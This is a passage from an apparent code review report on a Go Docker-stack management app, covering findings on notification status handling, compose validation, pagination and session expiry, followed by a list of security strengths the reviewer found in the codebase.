**Analysis:** The `pipeline.run.finished` event is emitted for both successful and failed pipeline completions (see `pipeline_executor.go:129-133`). The event includes a `Status` field, but the Slack notifier only checks `EventType()`, not the status. All pipeline completion notifications show a red X icon.

**Recommendation:** Type-assert to `PipelineRunFinished` and check the `Status` field:

```go
if e, ok := evt.(domevent.PipelineRunFinished); ok && e.Status == "success" {
    emoji = ":white_check_mark:"
    color = "#5adecd"
}
```

---

### D2. No compose file validation before persist

**Files:** `internal/app/stack_service.go:75-102` (Create), `internal/app/stack_service.go:154-187` (Update)

When a user creates or updates a stack, the compose content is written to disk and persisted to the database without any validation. Invalid YAML or a compose file with dangerous options (`privileged: true`, `network_mode: host`, bind-mounting `/`) is accepted silently. The user only discovers errors when they try to deploy.

**Recommendation:** Run `docker compose config` on the content before persisting. Optionally, parse the YAML and warn about security-sensitive directives (`privileged`, `cap_add`, host mounts, etc.).

---

### D3. No pagination on list endpoints

All list endpoints return unbounded results:
- `GET /api/v1/stacks` -- `StackRepo.List()` has no LIMIT
- `GET /api/v1/pipelines` -- `PipelineRepo.List()` has no LIMIT
- `GET /api/v1/containers` -- lists all Docker containers
- `GET /api/v1/users` -- `UserRepo.List()` has no LIMIT
- `GET /api/v1/webhooks` -- `WebhookRepo.ListAll()` has no LIMIT

**Recommendation:** Add `?page=1&per_page=25` query parameters and implement cursor or offset pagination in the repositories.

---

### D4. No session sliding window / refresh

Sessions have a fixed 24-hour TTL (`handler/auth.go:17`):

```go
const defaultSessionTTL = 24 * time.Hour
```

There is no mechanism to extend the session while the user is actively using the application. A user who logs in at 9 AM will be forcibly logged out at 9 AM the next day, even if they're actively working.

**Recommendation:** Either implement sliding expiration (extend TTL on each authenticated request) or add a `/api/v1/auth/refresh` endpoint that issues a new session token.

---

## POSITIVE OBSERVATIONS

These aspects of the codebase are well-done and worth noting:

1. **Clean DDD layering** -- Domain has zero infrastructure dependencies. Repository interfaces in domain, implementations in infra. Application services orchestrate. This is textbook correct.

2. **Graceful degradation** -- Docker, Valkey, pipelines, git, and notifications are all optional. The app starts and serves what it can.

3. **CSRF protection** -- The `X-Requested-With` check for cookie-based mutations while skipping API key auth is the correct pattern.

4. **Webhook signature verification** -- HMAC-SHA256 with constant-time comparison (GitHub/Gitea), constant-time token comparison (GitLab). All correct.

5. **Session fixation prevention** -- Login revokes all existing sessions before creating a new one (`auth_service.go:93-97`).

6. **bcrypt cost 12** -- Good choice. Not too slow, not too fast.

7. **API key design** -- SHA-256 hashed before storage, shown once at creation, `ck_` prefix for identification.

8. **Pipeline DAG validation** -- Cycle detection, topological sort, concurrent batch execution. Well implemented.

9. **Docker socket auto-detection** -- Supports Docker, Podman, rootless, and XDG runtime directories.

10. **Compose file path traversal protection** -- `ComposeStore.safeName()` and `ComposeStore.Delete()` both validate against directory escape.
